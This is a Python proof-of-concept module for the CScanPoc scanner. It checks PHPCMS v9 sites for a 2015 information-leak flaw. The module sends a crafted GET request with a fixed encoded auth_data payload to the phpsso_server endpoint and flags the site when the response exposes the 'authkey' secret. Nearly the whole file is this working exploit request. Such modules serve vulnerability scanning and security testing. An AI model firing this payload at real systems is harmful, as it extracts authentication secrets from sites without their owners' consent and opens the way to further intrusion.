# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0005' # 平台漏洞编号，留空
    name = 'PHPCMS v9 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-05-09'  # 漏洞公布时间
    desc = '''
        PHPCMS v9 信息泄露：
        phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'v9'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '82c07a2f-ded1-41ac-92ea-643f4a874a85'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #http://www.wooyun.org/bug.php?action=view&id=113005      
            payload = '/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ'
            r = requests.get(self.target + payload)

            if 'authkey' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
